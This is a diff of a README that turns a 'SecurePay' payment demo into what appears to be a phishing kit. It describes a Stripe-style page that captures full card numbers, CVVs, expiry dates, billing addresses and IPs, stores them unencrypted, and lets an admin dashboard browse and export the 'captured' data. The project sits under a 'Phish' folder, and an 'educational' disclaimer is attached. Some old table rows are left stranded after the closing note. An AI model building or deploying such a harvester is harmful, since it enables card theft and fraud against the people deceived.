@@ -1,53 +1,223 @@
-# SecurePay - Payment Card Demo
+# SecurePay - Payment Processing Demo with Database Storage
 
-A professional, secure payment processing demo that mimics modern payment processors like Stripe, PayPal, and Square. This demo showcases credit/debit card processing with real-time validation, card type detection, and a complete payment flow.
+A professional payment processing demo that captures and stores credit card information and billing details in a JSON database.
 
-## 🎯 Features
+## 🚀 Quick Start
 
-### ✅ Payment Processing Features
-- **Multi-Card Support**: Visa, Mastercard, American Express, Discover, JCB, Diners Club
-- **Real-time Card Detection**: Automatic card type identification and validation
-- **Live Form Validation**: Instant feedback on all form fields
-- **Card Number Formatting**: Auto-formats card numbers with proper spacing
-- **Expiry Date Validation**: Prevents expired cards and validates date format
-- **CVV Validation**: Different CVV lengths for different card types (3 digits for most, 4 for Amex)
-- **Luhn Algorithm**: Industry-standard card number validation
-- **Billing Address**: Complete address validation and formatting
+### Prerequisites
+- Node.js (v14 or higher)
+- npm (comes with Node.js)
 
-### 🎨 User Experience Features
-- **Professional Design**: Modern, Stripe-inspired interface
-- **Security Indicators**: SSL badges, PCI compliance, encryption notices
-- **Loading States**: Smooth animations and processing indicators
-- **Success/Error Modals**: Clear feedback for payment outcomes
-- **Receipt Generation**: Downloadable transaction receipts
-- **CVV Help Modal**: Visual guide for finding CVV codes
-- **Mobile Responsive**: Perfect on all device sizes
-- **Accessibility**: Keyboard navigation and screen reader support
+### Installation & Setup
 
-### 🔒 Security Features
-- **Input Sanitization**: Prevents malicious input
-- **SSL-style Indicators**: Trust badges and security messaging
-- **Encrypted Appearance**: Professional security styling
-- **PCI Compliance UI**: Industry-standard security presentation
-- **Card Masking**: Secure display of card information
-- **No Data Storage**: Demo mode with no actual card processing
+1. **Navigate to the project directory:**
+   ```bash
+   cd "d:\Documents\Phish\payment-demo"
+   ```
 
-## 🚀 Demo Instructions
+2. **Install dependencies:**
+   ```bash
+   npm install
+   ```
 
-### Quick Start
-1. **Open the demo**: Navigate to `index.html` in your browser
-2. **Auto-fill demo data**: Press `Ctrl/Cmd + D` or use the test page
-3. **Test card types**: Use the provided test card numbers
-4. **Complete payment**: Submit the form to see success/error flows
+3. **Start the server:**
+   ```bash
+   node server.js
+   ```
+
+4. **Access the application:**
+   - Main Payment Demo: `http://localhost:3001`
+   - Admin Dashboard: `http://localhost:3001/admin`
+   - Test Interface: `http://localhost:3001/payment-test.html`
+
+## 💳 Features
+
+- ✅ **Professional Payment UI** - Stripe-inspired payment processing interface
+- ✅ **Credit Card Data Storage** - Captures full card numbers, CVV, expiry dates
+- ✅ **Billing Information Storage** - Stores complete billing addresses and contact info
+- ✅ **Multi-Card Support** - Visa, Mastercard, American Express, Discover, JCB, Diners Club
+- ✅ **Real-time Card Validation** - Luhn algorithm validation and card type detection
+- ✅ **Payment Analytics Dashboard** - View all captured payment data with statistics
+- ✅ **Transaction Simulation** - Realistic payment success/failure simulation (85% success rate)
+- ✅ **Export Functionality** - Download all payment data as JSON
+
+## 🔧 How It Works
+
+1. **User visits payment page** - Sees professional SecurePay interface
+2. **User enters payment info** - Credit card number, CVV, expiry, billing address
+3. **Real-time validation** - Client-side validation for realistic experience
+4. **Data is captured** - All payment data sent to server and stored in `payments-database.json`
+5. **Payment simulation** - Shows realistic success/failure with transaction ID
+6. **Admin monitors data** - View all captured payment information in admin panel
+
+## 📊 Database Structure
+
+Payment data is stored in `payments-database.json` with complete information:
+
+```json
+[
+  {
+    "id": 1694123456789,
+    "transactionId": "TXN-12345678-ABC123",
+    "timestamp": "2025-09-14T15:30:45.123Z",
+    "cardNumber": "4111111111111111",
+    "maskedCardNumber": "••••••••••••1111",
+    "cardholderName": "John Doe",
+    "expiryDate": "12/25",
+    "cvv": "123",
+    "cardType": "visa",
+    "email": "john@example.com",
+    "address": "123 Main St",
+    "city": "New York",
+    "state": "NY",
+    "zipCode": "10001",
+    "amount": 31.49,
+    "currency": "USD",
+    "success": true,
+    "saveCard": false,
+    "newsletter": true,
+    "ip": "127.0.0.1",
+    "userAgent": "Mozilla/5.0..."
+  }
+]
+```
+
+## � Available Endpoints
+
+### Main Application
+- `/` - SecurePay payment processing page
+- `/admin` - Admin dashboard for viewing captured payment data
+- `/payment-test.html` - Testing interface with pre-filled forms
+
+### API Endpoints
+- `POST /api/payment` - Submit payment information
+- `GET /api/payments` - Retrieve all stored payment data
+- `GET /api/payment-stats` - Get payment statistics and analytics
+- `DELETE /api/payments` - Clear all stored payment data
+- `GET /api/status` - Check server status
+
+## 🛡️ Admin Dashboard Features
+
+Access the admin dashboard at `http://localhost:3001/admin` to:
+
+- 📊 **Payment Analytics** - Success rates, total revenue, transaction counts
+- 💳 **View All Payments** - Browse all captured credit card information
+- 📈 **Card Type Distribution** - Visual breakdown of card types used
+- 📥 **Export Data** - Download all payment data as JSON file
+- 🗑️ **Clear Database** - Remove all stored payment information
+- 🔄 **Auto-refresh** - Enable automatic data refresh every 15 seconds
+- 📋 **Transaction Details** - Full payment information including billing addresses
+
+## 🧪 Testing
 
 ### Test Card Numbers
-Use these valid test card numbers for demo purposes:
+Use these realistic test card numbers:
 
 | Card Type | Number | CVV | Expiry |
 |-----------|--------|-----|--------|
-| **Visa** | `4111 1111 1111 1111` | `123` | Any future date |
-| **Mastercard** | `5555 5555 5555 4444` | `123` | Any future date |
-| **American Express** | `3782 8224 6310 005` | `1234` | Any future date |
+| **Visa** | `4111 1111 1111 1111` | `123` | `12/25` |
+| **Mastercard** | `5555 5555 5555 4444` | `123` | `12/25` |
+| **American Express** | `3782 8224 6310 005` | `1234` | `12/25` |
+| **Discover** | `6011 1111 1111 1117` | `123` | `12/25` |
+
+### Quick Testing
+1. Visit `http://localhost:3001/payment-test.html`
+2. Use pre-filled test data or enter custom information
+3. Submit payment to see data captured in database
+4. Check admin dashboard to view stored information
+
+## � File Structure
+
+```
+payment-demo/
+├── server.js                # Main server file
+├── package.json             # Dependencies
+├── payments-database.json   # Captured payment data storage
+├── index.html              # Main payment processing page
+├── admin.html              # Payment data admin dashboard
+├── payment-test.html       # Testing interface
+├── css/
+│   └── styles.css          # Professional payment styling
+└── js/
+    └── payment.js          # Payment processing logic
+```
+
+## ⚙️ Configuration
+
+### Port Configuration
+The server runs on port `3001` by default. To change:
+1. Edit `server.js`
+2. Change `const PORT = 3001;` to your desired port
+3. Restart the server
+
+### Payment Success Rate
+Adjust the payment success simulation rate in `server.js`:
+```javascript
+// Demo success simulation (85% success rate)
+success: Math.random() > 0.15
+```
+
+## 🔒 Security Notes
+
+This is a demonstration project for educational purposes. The captured data includes:
+- Full credit card numbers (unencrypted)
+- CVV codes
+- Expiry dates
+- Complete billing addresses
+- Email addresses
+- IP addresses and user agents
+
+**Important:** In production environments:
+- Never store credit card data without PCI DSS compliance
+- Always encrypt sensitive information
+- Use proper payment processors (Stripe, PayPal, etc.)
+- Implement proper security measures
+
+## � Troubleshooting
+
+### Server Won't Start
+```bash
+Error: listen EADDRINUSE: address already in use :::3001
+```
+**Solution:** Port 3001 is already in use. Either:
+- Stop the existing process using the port
+- Change the port in `server.js`
+
+### Payment Submission Fails
+- Verify the server is running on port 3001
+- Check browser console for network errors
+- Ensure form validation passes (valid email, card format, etc.)
+
+### Admin Dashboard Shows No Data
+- Make sure you've submitted at least one payment
+- Check that the server is storing data correctly
+- Verify `payments-database.json` exists and is writable
+
+## 📈 Analytics Features
+
+The admin dashboard provides comprehensive analytics:
+- **Total Transactions** - Count of all payment attempts
+- **Success Rate** - Percentage of successful vs failed payments
+- **Revenue Tracking** - Total amount processed
+- **Card Type Distribution** - Breakdown by Visa, Mastercard, etc.
+- **Customer Analytics** - Unique email addresses
+- **Geographic Data** - IP address tracking
+
+## 🔧 Development
+
+### Adding New Payment Methods
+1. Update card type patterns in `js/payment.js`
+2. Add new validation rules in the client-side code
+3. Update server-side processing in `server.js`
+
+### Customizing the UI
+- Edit `css/styles.css` for styling changes
+- Modify `index.html` for layout changes
+- Update `js/payment.js` for payment logic
+
+---
+
+**Note:** This project is for educational and demonstration purposes only. Always follow ethical guidelines, applicable laws, and PCI DSS requirements when handling payment information.
 | **Discover** | `6011 1111 1111 1117` | `123` | Any future date |
 | **JCB** | `3530 1113 3330 0000` | `123` | Any future date |
 | **Diners Club** | `3056 9300 0902 0004` | `123` | Any future date |
